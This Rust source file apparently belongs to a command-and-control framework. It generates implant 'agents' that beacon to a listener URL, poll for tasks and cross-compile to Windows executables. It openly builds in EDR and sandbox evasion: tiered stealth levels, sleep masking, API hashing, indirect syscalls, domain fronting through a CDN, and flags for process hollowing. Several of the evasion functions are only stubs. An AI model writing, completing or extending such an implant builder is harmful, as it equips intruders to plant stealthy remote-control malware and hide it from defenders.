// src/agent/mod.rs - FIXED: Enhanced Agent Generator with EDR Evasion
use std::io;
use std::path::Path;
use std::fs::{File, create_dir_all, remove_dir_all};
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};

// Sub-modules for evasion techniques
pub mod evasion;
pub mod syscalls;
pub mod polymorphic;
pub mod environment;

use evasion::EvasionConfig;

#[derive(Clone)]
pub struct AgentGenerator;

// FIXED: Added missing fields to AgentConfig
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub listener_url: String,
    pub format: String,
    pub architecture: String,
    pub sleep_time: u32,
    pub jitter: u8,
    pub injection: String,
    pub output_path: String,
    pub evasion_enabled: bool,    // ADDED: missing field
    pub stealth_level: StealthLevel, // ADDED: missing field
}

// FIXED: Added Default implementation for AgentConfig
impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            listener_url: "http://127.0.0.1:8080".to_string(),
            format: "exe".to_string(),
            architecture: "x64".to_string(),
            sleep_time: 60,
            jitter: 10,
            injection: "self".to_string(),
            output_path: "agent.exe".to_string(),
            evasion_enabled: false,
            stealth_level: StealthLevel::Basic,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)] // ADDED: PartialEq
pub enum StealthLevel {
    Basic,      // Simple obfuscation
    Advanced,   // Syscalls + sleep masking
    Maximum,    // Full evasion suite
}

impl AgentGenerator {
    pub fn new() -> Self {
        AgentGenerator
    }
    
    // Main generation function with evasion support
    pub fn generate(&self, config: AgentConfig) -> io::Result<()> {
        println!("🎯 Generating evasive agent with config: {:?}", config);
        
        if let Some(parent) = Path::new(&config.output_path).parent() {
            create_dir_all(parent)?;
        }
        
        if config.evasion_enabled {
            return self.generate_evasive_agent(config);
        }
        
        // Fallback to original generation for compatibility
        self.generate_standard_agent(config)
    }
    
    // ADDED: Missing method generate_standard_agent
    fn generate_standard_agent(&self, config: AgentConfig) -> io::Result<()> {
        println!("📦 Generating standard agent without evasion features...");
        
        let project_dir = format!("{}_standard_project", config.output_path.trim_end_matches(".exe"));
        create_dir_all(format!("{}/src", &project_dir))?;
        
        // Basic Cargo.toml
        let basic_cargo = r#"[package]
name = "agent"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
"#;
        
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(basic_cargo.as_bytes())?;
        
        // Basic agent source
        let basic_source = format!(r#"// Basic agent without evasion
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    println!("Basic agent starting");
    
    loop {{
        // Basic beacon logic to {}
        tokio::time::sleep(Duration::from_secs({})).await;
    }}
}}
"#, config.listener_url, config.sleep_time);
        
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(basic_source.as_bytes())?;
        
        println!("📦 Basic agent project created at {}", project_dir);
        Ok(())
    }
    
    // Enhanced evasive agent generation
    fn generate_evasive_agent(&self, config: AgentConfig) -> io::Result<()> {
        println!("🛡️ Generating agent with {:?} evasion", config.stealth_level);
        
        let evasion_config = self.create_evasion_config(&config.stealth_level);
        
        if config.output_path.ends_with(".exe") {
            println!("🎯 Targeting Windows with evasion (.exe)");
            if let Ok(_) = self.try_evasive_cross_compile(&config, &evasion_config) {
                println!("✅ Evasive Windows agent ready: {}", config.output_path);
                return Ok(());
            }
        }
        
        if let Ok(_) = self.try_evasive_native_compile(&config, &evasion_config) {
            println!("✅ Evasive native agent ready: {}", config.output_path);
            return Ok(());
        }
        
        println!("⚠️ Direct compilation failed, creating evasive project...");
        self.generate_evasive_project(&config, &evasion_config)
    }
    
    // Create evasion configuration based on stealth level
    fn create_evasion_config(&self, stealth_level: &StealthLevel) -> EvasionConfig {
        match stealth_level {
            StealthLevel::Basic => EvasionConfig {
                sleep_mask: false,
                api_hashing: true,
                indirect_syscalls: false,
                domain_fronting: false,
                jitter_percentage: 15,
                user_agent_rotation: true,
                polymorphic_requests: false,
                ssl_pinning: false,
                process_hollowing: false,
            },
            StealthLevel::Advanced => EvasionConfig {
                sleep_mask: true,
                api_hashing: true,
                indirect_syscalls: true,
                domain_fronting: false,
                jitter_percentage: 25,
                user_agent_rotation: true,
                polymorphic_requests: true,
                ssl_pinning: false,
                process_hollowing: false,
            },
            StealthLevel::Maximum => EvasionConfig {
                sleep_mask: true,
                api_hashing: true,
                indirect_syscalls: true,
                domain_fronting: true,
                jitter_percentage: 35,
                user_agent_rotation: true,
                polymorphic_requests: true,
                ssl_pinning: false,
                process_hollowing: true,
            },
        }
    }
    
    // Evasive compilation methods
    fn try_evasive_cross_compile(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        println!("🔨 Cross-compiling evasive agent for Windows...");
        
        let temp_dir = "/tmp/evasive_agent_cross";
        self.create_evasive_rust_project(temp_dir, config, evasion_config)?;
        
        let output = Command::new("cargo")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Cross-compilation failed"));
        }
        
        let source = format!("{}/target/x86_64-pc-windows-gnu/release/evasive_agent.exe", temp_dir);
        if Path::new(&source).exists() {
            std::fs::copy(&source, &config.output_path)?;
            let _ = remove_dir_all(temp_dir);
            return Ok(());
        }
        
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn try_evasive_native_compile(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        println!("🔨 Native compilation of evasive agent...");
        
        let temp_dir = "/tmp/evasive_agent_native";
        self.create_evasive_rust_project(temp_dir, config, evasion_config)?;
        
        let output = Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Native compilation failed"));
        }
        
        for source in &[
            format!("{}/target/release/evasive_agent", temp_dir),
            format!("{}/target/release/evasive_agent.exe", temp_dir)
        ] {
            if Path::new(source).exists() {
                std::fs::copy(source, &config.output_path)?;
                Self::make_executable(&config.output_path)?;
                let _ = remove_dir_all(temp_dir);
                return Ok(());
            }
        }
        
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn generate_evasive_project(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        let project_dir = format!("{}_evasive_project", config.output_path.trim_end_matches(".exe"));
        create_dir_all(&project_dir)?;
        self.create_evasive_rust_project(&project_dir, config, evasion_config)?;
        println!("✅ Evasive project created: {}", project_dir);
        Ok(())
    }
    
    fn create_evasive_rust_project(&self, project_dir: &str, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        create_dir_all(format!("{}/src", project_dir))?;
        
        // Enhanced Cargo.toml with evasion dependencies
        let cargo_toml = self.generate_evasive_cargo_toml();
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;
        
        // Main evasive agent source
        let main_source = self.generate_evasive_source(config, evasion_config);
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(main_source.as_bytes())?;
        
        // Create evasion modules
        self.create_evasion_modules(project_dir)?;
        
        Ok(())
    }
    
    // ADDED: Missing method generate_evasive_cargo_toml
    fn generate_evasive_cargo_toml(&self) -> String {
        r#"[package]
name = "evasive_agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "evasive_agent"
path = "src/main.rs"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
rand = "0.8"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "winuser", "processthreadsapi", "handleapi", "wincon", "memoryapi", 
    "libloaderapi", "errhandlingapi", "winnt", "winerror"
] }

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
debug = false

[profile.release.package."*"]
opt-level = "z"
"#.to_string()
    }
    
    // ADDED: Missing method generate_evasive_source
    fn generate_evasive_source(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> String {
        format!(r#"// Auto-generated evasive agent
use std::time::Duration;
use tokio;
use rand::Rng;

mod evasion;
mod syscalls;
mod polymorphic;
mod environment;

use evasion::{{SleepMask, JitterEngine}};
use syscalls::{{SyscallResolver, IndirectSyscall}};
use polymorphic::{{PolymorphicHttp, DomainFronting}};
use environment::EnvironmentChecker;

const LISTENER_URL: &str = "{}";
const SLEEP_TIME: u64 = {};
const JITTER: u8 = {};
const STEALTH_ENABLED: bool = {};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    // Environment checks
    if EnvironmentChecker::is_analysis_environment() {{
        EnvironmentChecker::sandbox_evasion_behavior().await;
        return Ok(());
    }}
    
    // Initialize evasion components
    let mut sleep_mask = SleepMask::new();
    let jitter_engine = JitterEngine::new(Duration::from_secs(SLEEP_TIME), JITTER);
    let mut syscall_resolver = SyscallResolver::new();
    let http_engine = PolymorphicHttp::new();
    
    // Setup domain fronting if enabled
    {}
    
    println!("🔴 Evasive agent starting");
    
    let mut failures = 0;
    const MAX_FAILURES: usize = 5;
    
    loop {{
        // Generate polymorphic request
        let (url, headers) = http_engine.generate_request();
        let full_url = format!("{{}}{{}}", LISTENER_URL, url);
        
        // Perform beacon with evasion
        match perform_evasive_beacon(&full_url, &headers).await {{
            Ok(tasks) => {{
                failures = 0;
                for task in tasks {{
                    execute_task_with_evasion(&task, &mut syscall_resolver).await;
                }}
            }},
            Err(_e) => {{
                failures += 1;
                if failures >= MAX_FAILURES {{
                    break;
                }}
            }}
        }}
        
        // Sleep with evasion
        let sleep_duration = jitter_engine.business_hours_sleep();
        {}
    }}
    
    Ok(())
}}

async fn perform_evasive_beacon(url: &str, _headers: &std::collections::HashMap<String, String>) -> Result<Vec<String>, Box<dyn std::error::Error>> {{
    // Implement evasive HTTP beacon
    let client = reqwest::Client::new();
    let _response = client.get(url).send().await?;
    Ok(Vec::new())
}}

async fn execute_task_with_evasion(_task: &str, _syscall_resolver: &mut SyscallResolver) {{
    // Execute tasks using syscalls and evasion
}}
"#, 
            config.listener_url,
            config.sleep_time,
            config.jitter,
            evasion_config.sleep_mask,
            if evasion_config.domain_fronting {
                r#"let _domain_fronting = DomainFronting::new(
        "cdn.cloudflare.com".to_string(),
        LISTENER_URL.to_string()
    );"#
            } else {
                "// Domain fronting disabled"
            },
            if evasion_config.sleep_mask {
                "sleep_mask.mask_and_sleep(sleep_duration);"
            } else {
                "tokio::time::sleep(sleep_duration).await;"
            }
        )
    }
    
    // ADDED: Missing method create_evasion_modules
    fn create_evasion_modules(&self, project_dir: &str) -> io::Result<()> {
        let src_dir = format!("{}/src", project_dir);
        
        // Create evasion.rs
        let evasion_content = r#"use std::time::SystemTime;
use rand::Rng;

pub struct SleepMask {
    xor_key: u8,
}

impl SleepMask {
    pub fn new() -> Self {
        SleepMask {
            xor_key: rand::thread_rng().gen::<u8>(),
        }
    }
    
    pub fn mask_and_sleep(&mut self, duration: std::time::Duration) {
        println!("🔒 Sleep masking enabled");
        std::thread::sleep(duration);
    }
}

pub struct JitterEngine {
    base_interval: std::time::Duration,
    jitter_percentage: u8,
}

impl JitterEngine {
    pub fn new(base_interval: std::time::Duration, jitter_percentage: u8) -> Self {
        JitterEngine {
            base_interval,
            jitter_percentage,
        }
    }
    
    pub fn business_hours_sleep(&self) -> std::time::Duration {
        let mut rng = rand::thread_rng();
        let jitter_ms = rng.gen_range(0..1000);
        self.base_interval + std::time::Duration::from_millis(jitter_ms)
    }
}

pub fn obfuscate_string(input: &str) -> String {
    input.chars()
        .map(|c| ((c as u8).wrapping_add(1)) as char)
        .collect()
}

pub fn get_current_time() -> u64 {
    let _now = SystemTime::now();
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

pub fn resolve_api_by_hash(_hash: u32) -> Option<usize> {
    None
}
"#;
        std::fs::write(format!("{}/evasion.rs", src_dir), evasion_content)?;
        
        // Create syscalls.rs
        let syscalls_content = r#"use std::collections::HashMap;

pub struct SyscallResolver {
    syscall_numbers: HashMap<String, u16>,
}

impl SyscallResolver {
    pub fn new() -> Self {
        SyscallResolver {
            syscall_numbers: HashMap::new(),
        }
    }
    
    pub fn resolve_syscall_number(&mut self, _function_name: &str) -> Option<u16> {
        None
    }
}

pub struct IndirectSyscall;

impl IndirectSyscall {
    pub unsafe fn execute(_ssn: u16, _syscall_addr: usize, _args: &[usize]) -> usize {
        0
    }
}
"#;
        std::fs::write(format!("{}/syscalls.rs", src_dir), syscalls_content)?;
        
        // Create polymorphic.rs
        let polymorphic_content = r#"use std::collections::HashMap;
use rand::Rng;

pub struct PolymorphicHttp {
    user_agents: Vec<&'static str>,
}

impl PolymorphicHttp {
    pub fn new() -> Self {
        PolymorphicHttp {
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101",
            ],
        }
    }
    
    pub fn generate_request(&self) -> (String, HashMap<String, String>) {
        let mut rng = rand::thread_rng();
        let user_agent = self.user_agents[rng.gen_range(0..self.user_agents.len())];
        
        let mut headers = HashMap::new();
        headers.insert("User-Agent".to_string(), user_agent.to_string());
        
        ("/api/beacon".to_string(), headers)
    }
}

pub struct DomainFronting {
    pub fronted_domain: String,
    pub real_c2_domain: String,
}

impl DomainFronting {
    pub fn new(fronted_domain: String, real_c2_domain: String) -> Self {
        DomainFronting {
            fronted_domain,
            real_c2_domain,
        }
    }
}
"#;
        std::fs::write(format!("{}/polymorphic.rs", src_dir), polymorphic_content)?;
        
        // Create environment.rs
        let environment_content = r#"pub struct EnvironmentChecker;

impl EnvironmentChecker {
    pub fn is_analysis_environment() -> bool {
        false // Simplified
    }
    
    pub async fn sandbox_evasion_behavior() {
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}
"#;
        std::fs::write(format!("{}/environment.rs", src_dir), environment_content)?;
        
        Ok(())
    }
    
    fn make_executable(path: &str) -> io::Result<()> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(path)?.permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(path, perms)?;
        }
        Ok(())
    }
}